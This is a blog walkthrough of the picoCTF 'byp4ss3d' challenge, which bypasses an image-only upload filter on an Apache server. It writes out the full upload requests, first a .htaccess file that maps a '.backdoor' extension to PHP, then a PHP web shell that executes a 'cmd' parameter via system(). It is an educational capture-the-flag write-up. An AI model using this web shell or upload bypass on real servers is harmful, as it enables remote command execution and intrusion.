---
layout: post
title: "byp4ss3d PicoCTF"
date: 2025-11-19
categories: [ctf, picoctf, walkthrough]
image: https://miro.medium.com/v2/resize:fit:2000/format:webp/1*DJEtBw2KoP102M_U7q9MWQ.png
permalink: /blog/byp4ss3d_PicoCTF
locked: false
---

A university's online registration portal asks students to upload their ID cards for verification. The developer put some filters in place to ensure only image files are uploaded, but are they enough? Take a look at how the upload is implemented. Maybe there's a way to slip past the checks and interact with the server in ways you shouldn't.

<img 
  src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*Iqyhe_q1VlnX15qTt9sjwg.png"
  alt="Website initial view"
  class="zoomable-img"
  style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;"
/>

When we upload an image, it appears like this:

<img 
  src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*N7fwYGGoIcegv7Cw4oYhdg.png"
  alt="Website initial view"
  class="zoomable-img"
  style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;"
/>


This is how the request looks using Burp Suite:

<img 
  src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*joVxS7lgXKoxqej64mHY0A.png"
  alt="Website initial view"
  class="zoomable-img"
  style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;"
/>

I tried different extension bypasses, but they didn't work because they only showed results like this:

<img 
  src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*cbME_B0xUP4sP3nInhABzw.png"
  alt="Website initial view"
  class="zoomable-img"
  style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;"
/>

<img 
  src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*wNDMIIhNsExib8n0lvfGoQ.png"
  alt="Website initial view"
  class="zoomable-img"
  style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;"
/>

From here I tried different bypasses but none of them worked, so I decided to use the hint.

hint 1:

> Apache can be tricked into executing non-PHP files as PHP with a .htaccess file.

hint 2:

> Try uploading more than just one file.

For further reading, see these resources:

- Bypassing file upload filters using .htaccess (Infosec Writeups): [https://infosecwriteups.com/bypassing-file-upload-filter-using-htaccess-file-ctf-ca06d7e9ebd7](https://infosecwriteups.com/bypassing-file-upload-filter-using-htaccess-file-ctf-ca06d7e9ebd7)  
- Apache .htaccess HOWTO (official docs): [https://httpd.apache.org/docs/2.4/howto/htaccess.html](https://httpd.apache.org/docs/2.4/howto/htaccess.html)

## My explanation:

 1. What is the `.htaccess` file?

The `.htaccess` (or Hypertext Access) file is a configuration file used by the **Apache HTTP Server** to manage settings for a specific directory and its subdirectories.

-   **Decentralized Configuration:** Instead of requiring administrative access to the main server configuration (`httpd.conf`), Apache allows developers and users to place these files in their web directories to override or add specific directives.

-   **Purpose:** They are commonly used for tasks such as URL rewriting (`mod_rewrite`), custom error pages, restricting access (access control), and, in this case, **defining how files are handled** (MIME types).

2. The Exploit: MIME Type Re-Mapping with `AddType`

The exploit hinges on the fact that when Apache receives a request for a file, it uses the file's extension (or other configuration) to determine its **MIME type**, which tells the server and the browser what kind of content it is (e.g., `image/jpeg`, `text/html`).

 The Directive:

<div class="code-block-container">
  <span class="code-lang-tag">Terminal</span>
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none"/>
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  {% raw %}
  <pre><code class="Terminal">
AddType application/x-httpd-php .backdoor
</code></pre>
  {% endraw %}
</div>

| **Directive Component** | **Explanation** |
| --- | --- |
| **`AddType`** | This is the Apache directive that maps a given **MIME type** to a specific **file extension**. |
| **`application/x-httpd-php`** | This is the MIME type used by Apache to tell the server: "This content should be processed by the PHP interpreter." |
| **`.backdoor`** | This is the arbitrary file extension you chose. |

Now let's follow those steps:

<img 
  src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*MV03DXFezf8QtAxLjcp67A.png"
  alt="Website initial view"
  class="zoomable-img"
  style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;"
/>

<div class="code-block-container">
  <span class="code-lang-tag">Request</span>
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none"/>
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  {% raw %}
  <pre><code class="Request">
------geckoformboundary58b7d552bbae2dc3d17de786c141d311
Content-Disposition: form-data; name="image"; filename=".htaccess"
Content-Type: text/plain

AddType application/x-httpd-php .backdoor
------geckoformboundary58b7d552bbae2dc3d17de786c141d311--
</code></pre>
  {% endraw %}
</div>

<div class="code-block-container">
  <span class="code-lang-tag">Response</span>
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none"/>
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  {% raw %}
  <pre><code class="Response">
Successfully uploaded!<br>Access it at: &lt;a href='images/.htaccess'&gt;images/.htaccess&lt;/a&gt;
</code></pre>
  {% endraw %}
</div>


<img 
  src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*VWYzK6ALthrn4hfOhVfiUA.png"
  alt="Website initial view"
  class="zoomable-img"
  style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;"
/>

<div class="code-block-container">
  <span class="code-lang-tag">Request</span>
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none"/>
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  {% raw %}
  <pre><code class="Request">
------geckoformboundary58b7d552bbae2dc3d17de786c141d311
Content-Disposition: form-data; name="image"; filename="backdoor1.backdoor"
Content-Type: application/x-httpd-php

&lt;?php if(isset($_REQUEST['cmd'])){ echo "&lt;pre&gt;"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "&lt;/pre&gt;"; die; }?&gt;

------geckoformboundary58b7d552bbae2dc3d17de786c141d311--
</code></pre>
  {% endraw %}
</div>

<div class="code-block-container">
  <span class="code-lang-tag">Response</span>
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none"/>
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  {% raw %}
  <pre><code class="Response">
Successfully uploaded!<br>Access it at: &lt;a href='images/backdoor1.backdoor'>images/backdoor1.backdoor&lt;/a>
</code></pre>
  {% endraw %}
</div>

WHOAMI

<img 
  src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*bUN1ITdh79ZBF3cZDBV-MQ.png"
  alt="Website initial view"
  class="zoomable-img"
  style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;"
/>